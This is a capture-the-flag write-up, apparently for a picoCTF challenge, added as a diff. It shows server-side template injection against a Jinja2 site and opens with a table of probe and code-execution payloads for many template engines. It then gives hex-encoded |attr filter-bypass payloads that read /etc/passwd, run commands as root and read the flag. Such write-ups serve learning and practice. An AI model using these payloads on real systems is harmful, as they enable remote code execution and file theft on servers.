@@ -1,0 +1,224 @@
+Step 1: Check the hints.
+    hint1: Server Side Template Injection
+    hint2: Why is blacklisting characters a bad idea to sanitize input?
+
+Step 2: Check the Template Engine according below table.
+
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+|        Engine        |                                      Payload                                       |        Output           |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Jinja2 (Python)      | {{7*7}}                                                                            | 49                      |
+|                      | {{7*'7'}}                                                                          | 7777777                 |
+|                      | {{'a'+'b'}}                                                                        | ab                      |
+|                      | {{config}}                                                                         | Flask config dump       |
+|                      | {{''.__class__}}                                                                   | Object access           |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Twig (PHP)           | {{7*7}}                                                                            | 49                      |
+|                      | {{_self}}                                                                          | Twig context            |
+|                      | {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Freemarker (Java)    | ${7*7}                                                                             | 49                      |
+|                      | <#assign x="freemarker.template.utility.Execute"?new()> ${x("whoami")}             | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Velocity (Java)      | #set($x=7*7) $x                                                                    | 49                      |
+|                      | #set($str=$class.inspect("java.lang.String").type)                                 | Class access            |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Handlebars (JS)      | {{7*7}}                                                                            | Literal (safe)          |
+|                      | {{#with "s" as |string|}}{{#with "e"}}{{this.pop}}...{{/with}}{{/with}}            | Prototype pollution     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| ERB (Ruby)           | <%= 7*7 %>                                                                         | 49                      |
+|                      | <%= system("whoami") %>                                                            | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Smarty (PHP)         | {7*7}                                                                              | 49 (some versions)      |
+|                      | {php}echo `whoami`;{/php}                                                          | RCE if enabled          |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Mako (Python)        | ${7*7}                                                                             | 49                      |
+|                      | <% import os %>${os.system('whoami')}                                              | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Pebble (Java)        | {{7*7}}                                                                            | 49                      |
+|                      | {{someString.replace('a','b')}}                                                    | Method call             |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| AngularJS (JS)       | {{7*7}}                                                                            | 49 (if unsandboxed)     |
+|                      | {{constructor.constructor('alert(1)')()}}                                          | XSS                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Tornado (Python)     | {{7*7}}                                                                            | 49                      |
+|                      | {% import os %}{{os.system('whoami')}}                                             | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Django Templates     | {{7*7}}                                                                            | "7*7" (no eval)         |
+|                      | {% debug %}                                                                        | Context dump if enabled |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Thymeleaf (Java)     | ${7*7}                                                                             | 49                      |
+|                      | *{7*7}                                                                             | Alternative syntax      |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Jade / Pug (JS)      | - var x = 7*7                                                                      | JS eval                 |
+|                      | #{7*7}                                                                             | 49 if enabled           |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| EJS (JS)             | <%= 7*7 %>                                                                         | 49                      |
+|                      | <% require('child_process').exec('whoami') %>                                      | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Razor (.NET)         | @(7*7)                                                                             | 49                      |
+|                      | @System.Diagnostics.Process.Start("whoami")                                        | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Groovy (Java)        | ${7*7}                                                                             | 49                      |
+|                      | ${Class.forName("java.lang.Runtime").getRuntime().exec("whoami")}                  | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Mustache             | {{7*7}}                                                                            | "7*7" (no eval)         |
+|                      | {{{7*7}}}                                                                          | Same                    |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Vue.js (JS)          | {{7*7}}                                                                            | 49 (if unsandboxed)     |
+|                      | {{_c.constructor('alert(1)')()}}                                                   | XSS                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Spring EL (Java)     | ${7*7}                                                                             | 49                      |
+|                      | ${T(java.lang.Runtime).getRuntime().exec('whoami')}                                | RCE                     |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+| Bonus Polyglot       | ${7*7}{{7*7}}<%= 7*7 %>#{7*7}<!--#exec cmd="whoami"-->                             | Multi-engine test       |
++----------------------+------------------------------------------------------------------------------------+-------------------------+
+
+***After checking we found that the site is made with jinja2
+
+Step 3: Try to execute some commands.
+    {{[].__class__}}
+    {{ ''.__class__.__mro__[1].__subclasses__() }}
+    {{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__.eval('1+1') }}
+    {{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__.exec('import os; os.system("ls")') }}
+    when we try to execute this commands it shows: Stop trying to break me >:(
+    This means the dot (.) character is blacklisted or blocked
+    and the eval() and exec() functions might also be restricted.
+
+Step 4: Let's try to identify allowed objects.
+    {{''.__class__}}    -----> blocked
+    {{lipsum}}          -----> works properly
+    {{cycler}}          -----> works properly
+
+
+i)  {{ lipsum.__globals__.__builtins__.open('/etc/passwd').read() }}
+    {{ cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
+
+    we tried to execute these commands, but as (.) is 
+    blacklisted so we tried |attr and hex encoding and it works properly
+    Let's try to execute these commands(both give same output) using hex encoding:
+
+    {{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("open")("/etc/passwd")|attr("read")() }}
+    {{ cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("open")("/etc/passwd")|attr("read")() }}
+
+    These commands show below output:
+    <!doctype html>
+    <h1 style="font-size:100px;" align="center">
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+        sync:x:4:65534:sync:/bin:/bin/sync
+        games:x:5:60:games:/usr/games:/usr/sbin/nologin
+        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+        _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+    </h1>
+
+
+
+ii) {{lipsum.__globals__.os.popen('id').read()}}
+    {{cycler.__init__.__globals__.os.popen('id').read()}}
+
+    when I tried to execute these commands(both commands give same output) directly it shows:
+    Stop trying to break me >:(
+    Now let's try hex encoding to escape this.
+
+    {{lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr('get')('os')|attr('popen')('id')|attr('read')()}}
+    {{cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr('get')('os')|attr('popen')('id')|attr('read')()}}
+
+    These commands show below output:
+    <!doctype html>
+    <h1 style="font-size:100px;" align="center">
+        uid=0(root) gid=0(root) groups=0(root)
+    </h1>
+
+
+iii) We can see that we can access as root. Now let's list all the files of the system.
+    {{ lipsum.__globals__.os.popen('ls -la /').read() }}
+    {{ cycler.__init__.__globals__.os.popen('ls -la /').read() }}
+
+    as (.) dot character is blocked let's try hex encoding. Both commannds give same output so
+    use any of these commands.
+    {{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("ls -la /")|attr("read")() }}
+    {{ cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("ls -la /")|attr("read")() }}
+
+
+    It shows below output:
+    <!doctype html>
+    <h1 style="font-size:100px;" align="center">
+        total 0
+        drwxr-xr-x   1 root   root     23 May 20 03:20 .
+        drwxr-xr-x   1 root   root     23 May 20 03:20 ..
+        -rwxr-xr-x   1 root   root      0 May 20 03:20 .dockerenv
+        lrwxrwxrwx   1 root   root      7 Oct  6  2021 bin -&gt; usr/bin
+        drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
+        drwxr-xr-x   1 root   root     25 May 20 03:20 challenge
+        drwxr-xr-x   5 root   root    340 May 20 03:20 dev
+        drwxr-xr-x   1 root   root     66 May 20 03:20 etc
+        drwxr-xr-x   2 root   root      6 Apr 15  2020 home
+        lrwxrwxrwx   1 root   root      7 Oct  6  2021 lib -&gt; usr/lib
+        lrwxrwxrwx   1 root   root      9 Oct  6  2021 lib32 -&gt; usr/lib32
+        lrwxrwxrwx   1 root   root      9 Oct  6  2021 lib64 -&gt; usr/lib64
+        lrwxrwxrwx   1 root   root     10 Oct  6  2021 libx32 -&gt; usr/libx32
+        drwxr-xr-x   2 root   root      6 Oct  6  2021 media
+        drwxr-xr-x   2 root   root      6 Oct  6  2021 mnt
+        drwxr-xr-x   2 root   root      6 Oct  6  2021 opt
+        dr-xr-xr-x 186 nobody nogroup   0 May 20 03:20 proc
+        drwx------   1 root   root     20 Mar  6 03:40 root
+        drwxr-xr-x   5 root   root     58 Oct  6  2021 run
+        lrwxrwxrwx   1 root   root      8 Oct  6  2021 sbin -&gt; usr/sbin
+        drwxr-xr-x   2 root   root      6 Oct  6  2021 srv
+        dr-xr-xr-x  13 nobody nogroup   0 May 20 03:20 sys
+        drwxrwxrwt   1 root   root      6 Mar  6 03:40 tmp
+        drwxr-xr-x   1 root   root     19 Oct  6  2021 usr
+        drwxr-xr-x   1 root   root     41 Oct  6  2021 var
+    </h1>
+
+
+iv) challenge directory looks interesting. Let's list all files in this directory.
+    {{ lipsum.__globals__.os.popen('ls -la /challenge').read() }}
+    {{ cycler.__init__.__globals__.os.popen('ls -la /challenge').read() }}
+
+    **same commands hex encoded:
+    {{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("ls -la /challenge")|attr("read")() }}
+    {{ cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("ls -la /challenge")|attr("read")() }}
+
+    It shows below output:
+    <!doctype html>
+    <h1 style="font-size:100px;" align="center">
+        total 12
+        drwxr-xr-x 1 root root   25 May 20 03:20 .
+        drwxr-xr-x 1 root root   23 May 20 03:20 ..
+        drwxr-xr-x 2 root root   32 May 20 03:20 __pycache__
+        -rwxr-xr-x 1 root root 1841 Mar  6 03:27 app.py
+        -rw-r--r-- 1 root root   36 Mar  6 03:40 flag
+        -rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt
+    </h1>
+
+
+v) we got the flag. Let's read the flag:
+    {{ lipsum.__globals__.os.popen('cat /challenge/flag').read() }}
+    {{ cycler.__init__.__globals__.os.popen('cat /challenge/flag').read() }}
+
+    **same commands hex encoded:
+    {{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat /challenge/flag")|attr("read")() }}
+    {{ cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("cat /challenge/flag")|attr("read")() }}
+
+    It shows below outpt:
+    <!doctype html>
+    <h1 style="font-size:100px;" align="center">
+        picoCTF{sst1_f1lt3r_******_********}
+    </h1>
+
+<!----------Author's message: Give it a try yourself. Happy hacking!----------->
